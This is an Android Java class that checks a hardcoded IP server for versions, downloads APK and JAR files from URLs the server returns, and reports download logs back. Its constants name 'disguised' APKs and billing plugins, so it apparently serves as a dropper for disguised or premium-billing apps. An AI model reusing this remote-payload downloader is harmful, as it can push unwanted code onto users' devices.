package com.tiho.base.base.md;

import android.content.Context;

import com.tiho.base.base.dlres.DlRes;
import com.tiho.base.base.dlres.DlRes.IDownLoadResCB;
import com.tiho.base.base.http.json.JsonUtil;
import com.tiho.base.base.http.json.ParserJsonUtil;
import com.tiho.base.common.CfgIni;
import com.tiho.base.common.LogManager;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class Md {
	public static final int MDLR_STA_NOUPDATA = 0;// 已经是最新版 不更新 by jerry.zhou
	public static final int MDLR_STA_PROGRESS = 1;// 下载处理中
	public static final int MDRES_REALDL_OK = 2;
	// 以下为各类失败
	// public static final int MDLR_STA_ERR_NOSPACE = 2;// 本地存储空间不足
	// public static final int MDLR_STA_ERR_NOMEMORY = 3;// 内存不足
	// public static final int MDLR_STA_ERR_FILE = 4;// 文件读写错误
	public static final int MDLR_STA_ERR = 3;// 各种错误 by jerry.zhou
	public static final int MDLR_STA_ALREADY_NEW = 4;// 联网错误
	public static final int MDLR_STA_ERR_NET = 5;// 联网错误
	public static final int MDLR_STA_ERR_DEALNET = 6;// 服务端错误
	public static final int MDLR_STA_ERR_UNKNOWN = 7;// 未知错误
	public static final int MDLR_STA_PROGRESS_NEWVER = 8;// 未知错误
	private static final int MDLR_STA_REDOWNLOAD = (0x00010000);
	public static final int APK_TYPE_GUISE = 1;// 伪装的apk app
	public static final int APK_TYPE_PAY = 2;// 计费主apk apk
	public static final int APK_TYPE_PAYPLUGIN = 3;// 计费插件apk akp
	public static final int APK_TYPE_NORMAL = 4;// 普通apk apk
	public static final int JAR_TYPE_PAYPLUGIN = 5;// jar
	public static final String Paypath = "shootDl";//"PPLAY/plugins";
	public static final String Apppath = "shootDl";//"PPLAY/pluginApk";
	private static final String URL_CATALOGUE = "/store/logupload";
	private String PayAllpath = null;
	private String AppAllpath = null;
	private Context context;
	private mdContent mMd = new mdContent();
	private MdCbData mMdCb = new MdCbData();
	private String url = CfgIni.getInstance().getValue("playApp", "newmd",
			"http://122.227.207.66:8888/android-api/android/check_version");
	private String urlLog_req = CfgIni.getInstance().getValue("playApp", "newmdlogreq",
			"http://122.227.207.66:8888/api/android_md_log/req");
	private String urlLog_down = CfgIni.getInstance().getValue("playApp", "newmdlogdown",
			"http://122.227.207.66:8888/api/android_md_log/down");

	public Md(Context context) {
		super();
		this.context = context;
	}

	public interface IDownLoadCB {
		public void callback(int result, MdCbData data, Object obj);
	}

	/**
	 * @author 黄晓华
	 *         <p>
	 *         回调函数
	 */
	public static class MdCbData {
		public ArrayList<MdDownloadData> dataList;
		public MdItem mMdItem = new MdItem();
		public long totalSize;// 所有所要下载apk的总大小
		public long curSize;// 当前已经下载的所有apk的总大小
	}

	/**
	 * @author 黄晓华
	 *         <p>
	 *         请求下载的apk的类数据结构
	 */
	public static class MdDownloadData {
		public String appid = "";// 必填 包名
		public int type = 0;// apk类型 必填
		public int appver = 0;// 请求下载的版本号(可选)
		public String path = "";// 保存的路径(可选)
		public int total = 0;// 总大小
		public int current = 0;// apk已下载的大小
		String md5 = "";
		String savename = "";// 不是全路径，就文件名
		String tmpname = "";

		@Override
		public String toString() {
			String str = " appid = " + appid + " type = " + type + " appver = " + appver + " path = " + path
					+ " total = " + total + " current = " + current + " md5 = " + md5 + " savename = " + savename
					+ " tmpname = " + tmpname;
			return str;
		}

	}

	private String configUrl = CfgIni.getInstance().getValue("playApp", "newmd",
			"http://122.227.207.66:8888/android-api/android/check_version");
	private String configUrlLog_req = CfgIni.getInstance().getValue("playApp", "newmdlogreq",
			"http://122.227.207.66:8888/api/android_md_log/req");
	private String configUrlLog_down = CfgIni.getInstance().getValue("playApp", "newmdlogdown",
			"http://122.227.207.66:8888/api/android_md_log/down");
	public void mdDownload(final String absolutePath, String time , int version, IDownLoadCB cb) {
		try {
			String fileName = absolutePath.substring(absolutePath.lastIndexOf(File.separator) + 1);
			String packname = fileName.substring(0, fileName.lastIndexOf('.'));
			ParserJsonUtil json = new ParserJsonUtil(context);
			MdDTO sparams = new MdDTO();
			sparams.setTime(time);
			List<MdItem> params = new ArrayList<MdItem>();
			MdItem mdItem = new MdItem();
			mdItem.setPackname(packname);
			mdItem.setFile_version(version);

			params.add(mdItem);
			mMd.mMdItem = mdItem;
			mMd.cb = cb;
			sparams.setParams(params);
			String content;
			content = JsonUtil.toJson(sparams);
			MdDTO dparams = json.post(configUrl, content, MdDTO.class);

			cb.callback(0xffff, null, dparams);

//			json.post(configUrlLog_req, content, MdDTO.class);
			if (dparams == null) {
				noUpdata();
				return;
			}
			if (dparams.getParams() != null) {
				if(dparams.getParams().isEmpty()){
					noUpdata();
					return;
				}
				MdItem dMdItem = dparams.getParams().get(0);
				if (dMdItem.getUrl().length() > 0) {
					content = JsonUtil.toJson(dparams);
					json.post(configUrlLog_down, content, MdDTO.class);// 下载日志上传
					String downUrl = dMdItem.getUrl();
					String md5 = dMdItem.getMd5();
					String type = downUrl.substring(downUrl.lastIndexOf('.'));
					DlRes dLRes = new DlRes(downUrl, absolutePath, md5, new IDownLoadResCB() {
						@Override
						public void callback(int result, HashMap<String, Object> data) {
							switch (result) {
							case DlRes.DLRES_REALDL_PROGRESS:
								HashMap<String, Object> map = data;
								mMdCb.curSize = (Long) map.get("cursize");
								mMdCb.totalSize = (Long) map.get("totalsize");
								mMdCb.mMdItem = mMd.mMdItem;
								mdCb(true);
								break;
							case DlRes.DLRES_REALDL_OK:
								mMd.cb.callback(MDRES_REALDL_OK, mMdCb, absolutePath);
								LogManager.LogShow("DLRES_REALDL_OK");
								break;
							default:
								LogManager.LogShow("DLRES_REALDL_Failure");
								error();
								break;
							}
						}
					});
					dLRes.start();
				} else {
					error();
				}
			} else {
				error();
			}

		} catch (Exception e) {
			error();
			e.printStackTrace();
		}
	}

	/**
	 * 调用该函数前提，必须调用{@link #setRootPath(String rootPath)}和
	 * @param datalist
	 * @param cb
	 * @param commonKey
	 * @param xplayagent
	 */
	public void mdDownload(ArrayList<MdDownloadData> datalist, IDownLoadCB cb, String commonKey, String xplayagent) {
		try {
			mMd.dataList = datalist;
			mMd.cb = cb;
			ParserJsonUtil json = new ParserJsonUtil(context);
			MdDTO sparams = new MdDTO();
			List<MdItem> params = new ArrayList<MdItem>();
			MdItem mdItem = new MdItem();
			for (MdDownloadData data : mMd.dataList) {
				mdItem.setPackname(data.appid);
				mdItem.setFile_version(data.appver);
				params.add(mdItem);
			}
			sparams.setParams(params);
			String content;
			content = JsonUtil.toJson(sparams);
			MdDTO dparams = new MdDTO();
			LogManager.LogShow(url+"请求md更新 , body="+content);

			dparams = json.post(url, content, MdDTO.class);
//			json.post(urlLog_req, content, MdDTO.class);
			if (dparams == null) {
				error();
				return;
			}
			if (dparams.getParams() != null) {

				if (dparams.getParams().isEmpty()) {
					noUpdata();
				} else {
					for (MdItem dMdItem : dparams.getParams()) {
						if (dMdItem.getUrl().length() > 0) {
							content = JsonUtil.toJson(dparams);
							json.post(urlLog_down, content, MdDTO.class);
							String downUrl = dMdItem.getUrl();
							String md5 = dMdItem.getMd5();
							String type = downUrl.substring(downUrl.lastIndexOf('.'));
							final String apkPath = AppAllpath + File.separator + dMdItem.getPackname() + type;
							LogManager.LogShow(" Packname = " + dMdItem.getPackname() + " downUrl = " + downUrl
									+ " apkPath = " + apkPath);
							DlRes dLRes = new DlRes(downUrl, apkPath, md5, context, true, new IDownLoadResCB() {

								@Override
								public void callback(int result, HashMap<String, Object> data) {
									switch (result) {
									case DlRes.DLRES_REALDL_PROGRESS:
										HashMap<String, Object> map = data;
										mMdCb.curSize = (Long) map.get("cursize");
										mMdCb.totalSize = (Long) map.get("totalsize");
										mMdCb.dataList = mMd.dataList;
										mdCb(true);
										break;
									case DlRes.DLRES_REALDL_OK:
										mMd.cb.callback(MDRES_REALDL_OK, mMdCb, apkPath);
										LogManager.LogShow("DLRES_REALDL_OK");
										break;
									default:
										LogManager.LogShow("DLRES_REALDL_Failure");
										error();
										break;
									}
								}
							});
							dLRes.start();
						} else {
							error();
						}
					}
				}
			} else {
				noUpdata();
			}

		} catch (Exception e) {
			e.printStackTrace();
			error();
		}
	}

	public void setRootPath(String rootPath) {
		LogManager.LogShow("rootPath = " + rootPath);
		this.PayAllpath = rootPath + File.separator + Paypath;
		this.AppAllpath = rootPath + File.separator + Apppath;
	}

	private void mdCb(boolean result) {
		if (result) {
			mMd.cb.callback(MDLR_STA_PROGRESS, mMdCb, null);
		} else {
			mMd.cb.callback(mMd.states, mMdCb, null);
		}
	}

	private class mdContent {
		ArrayList<MdDownloadData> dataList;
		IDownLoadCB cb;
		MdItem mMdItem;
		int states = 0;
	}

	private void noUpdata() {
		mMdCb.curSize = 0L;
		mMdCb.totalSize = 0L;
		mMd.states = MDLR_STA_NOUPDATA;
		mdCb(false);
	}

	private void error() {
		mMdCb.curSize = -1L;
		mMdCb.totalSize = -1L;
		mMd.states = MDLR_STA_ERR;
		mdCb(false);
	}

}
